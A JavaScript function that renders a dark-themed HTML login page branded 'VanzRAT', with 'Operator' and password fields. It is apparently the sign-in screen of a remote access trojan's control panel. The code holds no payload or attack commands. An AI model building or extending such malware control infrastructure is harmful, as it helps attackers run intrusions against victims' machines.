export function renderLogin(title) {
  return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title} • Login</title>
<style>
:root{--bg:#0a0c10;--bg2:#0f1218;--bg3:#161a22;--line:#1e2530;
 --fg:#c9d1d9;--fg2:#7d8794;--acc:#22d3ee}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:system-ui,sans-serif;
 min-height:100vh;display:flex;align-items:center;justify-content:center;
 background-image:radial-gradient(circle at 20% 30%,rgba(34,211,238,.06),transparent 40%),
 radial-gradient(circle at 80% 70%,rgba(168,85,247,.05),transparent 40%)}
.box{width:100%;max-width:380px;padding:32px;background:var(--bg2);
 border:1px solid var(--line);border-radius:12px;
 box-shadow:0 20px 60px rgba(0,0,0,.5)}
.logo{display:flex;align-items:center;gap:10px;margin-bottom:24px;
 font-size:18px;font-weight:600;letter-spacing:.04em}
.logo .dot{width:10px;height:10px;border-radius:50%;background:var(--acc);
 box-shadow:0 0 16px var(--acc);animation:p 2s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.4}}
label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.1em;
 color:var(--fg2);margin-bottom:6px;font-weight:600;margin-top:14px}
input{width:100%;background:var(--bg);border:1px solid var(--line);color:var(--fg);
 padding:11px 12px;border-radius:6px;font-family:ui-monospace,monospace;
 font-size:13px;outline:none;transition:.15s}
input:focus{border-color:var(--acc)}
button{width:100%;margin-top:22px;background:var(--acc);color:#001014;
 border:0;padding:12px;border-radius:6px;font-weight:700;letter-spacing:.06em;
 cursor:pointer;font-size:13px;text-transform:uppercase;transition:.15s}
button:hover{background:#06b6d4}
.meta{margin-top:18px;font-size:11px;color:#4b5563;text-align:center;
 font-family:ui-monospace,monospace}
</style></head><body>
<form class="box" method="POST" action="/login">
  <div class="logo"><span class="dot"></span>VanzRAT</div>
  <label>Operator</label>
  <input name="username" autocomplete="username" required autofocus>
  <label>Password</label>
  <input name="password" type="password" autocomplete="current-password" required>
  <button type="submit">Authenticate</button>
  <div class="meta">secure channel • edge node</div>
</form>
</body></html>`;
}
